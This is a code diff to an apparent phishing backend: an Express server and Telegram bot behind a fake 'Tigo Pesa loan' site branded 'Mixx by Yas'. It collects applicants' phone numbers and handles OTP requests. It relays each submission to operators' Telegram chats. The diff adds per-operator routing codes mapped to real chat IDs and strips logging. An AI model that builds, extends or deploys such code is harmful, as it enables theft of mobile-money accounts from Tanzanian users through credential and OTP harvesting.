@@ -1,13 +1,10 @@
 /**
- * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
+ * **MIXX BY YAS - BACKEND SERVER (PROFESSIONAL ADMIN KEYWORD MAPPING)**
  * 
  * Includes:
- * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
- * - Root URL serves the main user application (app.html).
- * - Secured private path serves the admin panel (admin.html).
- * - Request New OTP handling with 30s countdown integration.
- * - Dynamic Admin URL parameter parsing (?admin=CHAT_ID) for routing notifications.
- * - Raw clickable URLs directly in Telegram welcome message to open instantly.
+ * - Professional numeric admin ID parameters (?admin=01, ?admin=02).
+ * - Strict Tigo Pesa Tanzania number validation.
+ * - Full multi-admin routing and session handling.
  */
 
 const express = require('express');
@@ -33,8 +30,21 @@ let bot = null;
 const sessions = new Map();
 
 /**
+ * **PROFESSIONAL ADMIN ID MAPPING DICTIONARY**
+ * Map professional numbers (01, 02, etc.) to each admin's actual Telegram Chat ID.
+ */
+const ADMIN_MAPPING = {
+  "01": "8524294724", // Link will be: ?admin=01
+  "02": "577853345"   // Link will be: ?admin=02
+};
+
+function resolveAdminChatId(adminKeyOrId) {
+  if (!adminKeyOrId) return DEFAULT_CHAT_ID;
+  return ADMIN_MAPPING[adminKeyOrId.toLowerCase()] || adminKeyOrId || DEFAULT_CHAT_ID;
+}
+
+/**
  * **TIGO PESA TANZANIA NUMBER VALIDATOR**
- * Valid Tigo prefixes: 065, 067, 071, 077.
  */
 function isValidTigoNumber(phoneStr) {
   if (!phoneStr) return false;
@@ -55,15 +65,11 @@ async function initBot() {
       console.error('USE_WEBHOOK is true but APP_URL is not set; cannot enable webhook mode.');
       process.exit(1);
     }
-    console.log('[Bot] Starting in WEBHOOK mode.');
     bot = new TelegramBot(TOKEN, { polling: false });
-
     const webhookPath = `/bot${TOKEN}`;
     const webhookUrl = `${APP_URL}${webhookPath}`;
     try {
-      console.log(`[Bot] Setting webhook to ${webhookUrl}`);
       await bot.setWebHook(webhookUrl);
-      console.log('[Bot] Webhook set successfully.');
       app.post(webhookPath, (req, res) => {
         res.sendStatus(200);
         try {
@@ -73,46 +79,27 @@ async function initBot() {
         }
       });
     } catch (err) {
-      console.error('[Bot] Failed to set webhook:', err?.response?.body || err.message || err);
+      console.error('[Bot] Failed to set webhook:', err);
       process.exit(1);
     }
   } else {
-    console.log('[Bot] Starting in POLLING mode (will ensure webhook is removed first).');
     try {
       const info = await telegramApi('getWebhookInfo');
       if (info && info.ok && info.result && info.result.url) {
-        console.log('[Bot] Detected existing webhook:', info.result.url);
-        console.log('[Bot] Deleting existing webhook to allow polling...');
-        const del = await telegramApi('deleteWebhook');
-        if (del && del.ok) {
-          console.log('[Bot] Webhook deleted.');
-        } else {
-          console.warn('[Bot] deleteWebhook response:', del);
-        }
-      } else {
-        console.log('[Bot] No webhook configured; safe to start polling.');
+        await telegramApi('deleteWebhook');
       }
-    } catch (err) {
-      console.warn('[Bot] Could not query webhook info (continuing):', err?.message || err);
-    }
-
+    } catch (err) {}
     bot = new TelegramBot(TOKEN, { polling: true });
-    console.log('[Bot] Polling started.');
   }
 
-  bot.on('polling_error', (err) => {
-    console.error('[Bot] polling_error:', err?.message || err);
-  });
-
-  bot.on('webhook_error', (err) => {
-    console.error('[Bot] webhook_error:', err?.message || err);
-  });
+  bot.on('polling_error', (err) => console.error('[Bot] polling_error:', err?.message || err));
+  bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));
 
   /**
-   * **INSTANT /START COMMAND HANDLER WITH RAW CLICKABLE LINKS**
+   * **INSTANT /START COMMAND HANDLER WITH PROFESSIONAL NUMERIC LINKS**
    */
   bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
+    const chatId = String(msg.chat.id);
     const user = msg.from;
 
     const firstName = user.first_name || 'Not Provided';
@@ -120,8 +107,11 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Direct raw links replacing custom display text
-    const customAdminBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${chatId}`;
+    // Find professional numeric code or fallback to chat ID if not found
+    let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId) || chatId;
+
+    // Professional link format: ?admin=01
+    const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${adminCode}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
     const userWelcomeInfo = 
@@ -129,7 +119,7 @@ async function initBot() {
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
       `🏷 **Username:** ${username}\n` +
-      `🔗 **Browse Application Link:** ${customAdminBrowseLink}\n` +
+      `🔗 **Browse Application Link:** ${cleanBrowseLink}\n` +
       `🔗 **Admin Dashboard Link:** ${secureAdminLink}`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
@@ -184,22 +174,14 @@ async function initBot() {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
           { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        ).catch(err => console.log('Could not clear markup:', err.message));
+        ).catch(err => {});
       }
-
-    } catch (err) {
-      console.error('[Bot] callback_query handler error:', err);
-    }
+    } catch (err) {}
   });
-}
-
-function getTargetChatId(reqChatId) {
-  return reqChatId || DEFAULT_CHAT_ID;
 }
 
 /**
  * **EXPLICIT ROUTE FOR USER APPLICATION (ROOT URL)**
- * Serves app.html for regular users or admins browsing via query parameters.
  */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app.html'));
@@ -207,7 +189,6 @@ app.get('/', (req, res) => {
 
 /**
  * **SECURED / HIDDEN ROUTE FOR ADMIN PANEL**
- * Maps requests for the private admin dashboard to 'admin.html'.
  */
 app.get('/secret-admin-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
@@ -223,11 +204,11 @@ app.post('/api/submit-application', (req, res) => {
     if (!isValidTigoNumber(phone)) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Invalid phone number. Only registered Tigo Pesa Tanzania numbers (starting with 065, 067, 071, or 077) are allowed.' 
+        error: 'Invalid phone number format.' 
       });
     }
 
-    const targetChat = getTargetChatId(adminChatId);
+    const targetChat = resolveAdminChatId(adminChatId);
     const userId = phone || `user_${Date.now()}`;
 
     sessions.set(userId, {
@@ -240,7 +221,7 @@ app.post('/api/submit-application', (req, res) => {
     });
 
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'No admin chat ID configured or provided' });
+      return res.status(400).json({ success: false, error: 'No admin chat ID configured' });
     }
 
     const message =
@@ -269,12 +250,10 @@ app.post('/api/submit-application', (req, res) => {
         res.status(200).json({ success: true, userId });
       })
       .catch(err => {
-        console.error('Telegram API Error:', err.message);
         res.status(500).json({ success: false, error: 'Telegram notification failed' });
       });
 
   } catch (error) {
-    console.error('Server Error:', error);
     res.status(500).json({ success: false, error: 'Internal server error' });
   }
 });
@@ -361,7 +340,7 @@ app.post('/api/request-new-otp', (req, res) => {
 // Start initialization & HTTP server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
-  console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
+  console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-                                  
+  
